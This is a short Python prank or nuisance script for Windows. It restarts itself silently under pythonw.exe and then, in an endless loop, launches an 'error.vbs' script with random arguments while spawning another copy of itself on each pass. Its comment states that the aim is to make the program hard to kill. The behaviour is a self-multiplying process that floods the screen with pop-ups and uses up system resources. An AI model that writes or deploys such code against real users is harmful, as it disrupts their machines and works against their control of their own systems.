import subprocess
import secrets
import sys
import pathlib

def startNewInstance():
    subprocess.run(["pythonw.exe", __file__, "1>NUL", "2>&1"], shell=True)


if 'pythonw.exe' in sys.executable:
    while True:
        subprocess.run(["error.vbs", secrets.token_urlsafe(32), secrets.token_urlsafe(16)], shell=True)
        # make it really annoying to kill if you have clicked "ok" about 5 or more times
        startNewInstance()
else:
    startNewInstance()
